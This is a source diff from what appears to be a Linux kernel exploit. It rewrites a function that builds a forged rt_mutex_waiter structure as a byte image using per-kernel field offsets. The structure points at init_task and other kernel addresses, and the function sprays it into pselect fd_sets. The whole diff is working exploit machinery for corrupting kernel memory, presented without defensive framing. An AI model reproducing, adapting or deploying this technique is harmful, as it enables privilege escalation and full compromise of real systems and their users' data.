@@ -100,29 +100,41 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(ex);
 
   int words_per_set = slide_pselect_words_per_set();
-  struct slide_waiter_word {
-    int word;
+
+  // Build the forged rt_mutex_waiter as a byte image using the target's real
+  // field offsets, then spill it into the fd_sets a word at a time. The word
+  // indices are deliberately not hardcoded: rt_mutex_waiter is laid out
+  // differently per kernel line (see FAKE_WAITER_* in the target headers), so
+  // the same field can land in a different word — and on 6.1 prio and
+  // wake_state share one word, which a per-word table cannot express.
+  unsigned char waiter[FAKE_WAITER_SIZE];
+  memset(waiter, 0, sizeof(waiter));
+  put64(waiter, FAKE_WAITER_TREE_ENTRY_OFF + 0x00, SLIDE_LOGGERS_0_1);
+  put64(waiter, FAKE_WAITER_TREE_ENTRY_OFF + 0x08, 0);
+  put64(waiter, FAKE_WAITER_TREE_ENTRY_OFF + 0x10, SLIDE_RANDOM_BOOT_ID_DATA);
+  put32(waiter, FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+  put64(waiter, FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+  put64(waiter, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, SLIDE_LOGGERS_0_1);
+  put64(waiter, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
+  put64(waiter, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, SLIDE_RANDOM_BOOT_ID_DATA);
+  put32(waiter, FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+  put64(waiter, FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+  put64(waiter, FAKE_WAITER_TASK_OFF, SLIDE_INIT_TASK);
+  put64(waiter, FAKE_WAITER_LOCK_OFF, fake_lock);
+  put32(waiter, FAKE_WAITER_WAKE_STATE_OFF, 3);
+  put64(waiter, FAKE_WAITER_WW_CTX_OFF, 0);
+
+  // Zero words are skipped rather than placed: the fd_sets were just cleared,
+  // so writing a zero word is a no-op, and skipping keeps the "cannot place"
+  // warning meaningful for words that actually carry a value.
+  for (size_t word = 0; word < sizeof(waiter) / sizeof(uint64_t); word++) {
     uint64_t value;
-    const char *name;
-  } words[] = {
-    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
-    {1, 0, "tree_right"},
-    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
-    {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_LOGGERS_0_1, "pi0"},
-    {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
-    {8, FAKE_WAITER_PRIO, "pi_prio"},
-    {9, 0, "pi_deadline"},
-    {10, SLIDE_INIT_TASK, "task"},
-    {11, fake_lock, "lock"},
-    {12, 3, "wake_state"},
-    {13, 0, "ww_ctx"},
-  };
-  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
-    struct slide_waiter_word *w = &words[i];
+    memcpy(&value, waiter + word * sizeof(uint64_t), sizeof(value));
+    if (!value) {
+      continue;
+    }
     slide_pselect_put_waiter_word(
-        in, out, ex, words_per_set, w->word, w->value, w->name);
+        in, out, ex, words_per_set, (int)word, value, "waiter");
   }
 }
 
